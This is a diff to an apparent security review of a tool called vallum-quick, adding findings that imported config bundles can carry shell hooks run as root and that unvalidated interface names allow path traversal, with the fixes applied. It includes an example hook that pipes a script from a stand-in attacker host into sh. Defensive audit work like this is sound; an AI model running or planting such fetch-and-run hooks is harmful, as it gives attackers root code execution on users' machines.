@@ -61,6 +61,57 @@ believes the import is just an address and a key.
 - **Second half**: a control path outside `/run/vallum` should be a warning even
   in non-strict mode, because it is the one that lets *other local users* in.
 
+## R2-4 — A bundle is root code execution, and nothing said so (critical, fixed)
+
+`[quick] pre_up` / `post_up` / `post_down` are shell commands. `vallum-quick`
+runs each with `sh -c <hook>` **as root**, from the config, at attach
+(`crates/vallum-quick/src/hooks.rs:101`). A bundle carries the config verbatim,
+so `import-bundle` writes a file whose next attach executes:
+
+```toml
+[quick]
+pre_up = ["curl -s https://evil.example/x.sh | sh"]
+```
+
+The import path mentioned hooks nowhere. This is strictly worse than R2-2: R2-2
+lets a server choose a weaker *setting*, this lets a server run a *program* as
+root on the client, and it needs no further interaction after the operator
+imports a file they were told is "an address and a key".
+
+The attacker needs to get a bundle in front of the operator — the same
+precondition as every supply-chain attack, and the reason bundles exist.
+
+### Blue
+
+**Refuse by default, not warn.** `import_with_policy` rejects any bundle carrying
+hooks; `--allow-hooks` accepts one for an operator who wrote them. A warning
+printed next to a root `sh -c` is not a control, which is why this departs from
+ADR-0033's "report and let `--strict` refuse" for every other finding.
+
+Verified: the crafted bundle above is refused with the reason and the way out,
+and accepted with `--allow-hooks`.
+
+### Follow-on, not done
+
+Hooks are still the strongest thing a *local* config can do, and a local config
+is written by root. If hooks ever become settable by the control socket, that is
+a new decision.
+
+## R2-5 — A config's interface name reaches root-owned file paths unvalidated (low)
+
+`materialize` takes `interface` straight from `config.interface.name`
+(`vallum-quick/src/main.rs:242`), and `log_path`/`ready_path` join it into
+`/run/vallum`. A name containing `..` therefore creates or truncates a root-owned
+file outside `/run/vallum` — bounded by the fixed `.quick-ns.log` /
+`.quick-ns.ready` suffixes, which is why this is low and not critical: the
+attacker cannot name the target file freely, only the directory.
+
+### Blue
+
+Validate the name at config load: `[A-Za-z0-9_.-]{1,15}`, no `/`, no leading
+`-`. The kernel would reject a bad name later anyway; the file writes happen
+first.
+
 ## R2-3 — The DAC rule is only visible after it bites (low)
 
 `private_key = "/etc/shadow"` is a legal config and fails with
@@ -103,10 +154,11 @@ attach path (which runs as root and rewrites `resolv.conf`).
 
 ## Ranked blue backlog from both rounds
 
-1. **R2-1** — one line in a unit file, removes a permanent-outage class.
-2. **ADR-0030/0032 already landed** — the replay amplifier (round one, H1).
-3. **R2-2** — the import-policy report; the client's trust in a server is
-   currently unbounded and unstated.
+1. **R2-4** — fixed; the worst finding in either round.
+2. **R2-1** — fixed; one line in a unit file, removes a permanent-outage class.
+3. **ADR-0030/0032 already landed** — the replay amplifier (round one, H1).
+4. **R2-2** — half 1 landed; half 2 (signed manifest) is ADR-0033's open end.
+5. **R2-5** — name validation, cheap and mechanical.
 4. **M4 production pinning** (ADR-0029) — before any host with a second user.
 5. **R2-3** — the DAC rule in the deployment docs.
 6. **XDP admission** (ADR-0032's successor) — the only way past the 6.5 µs
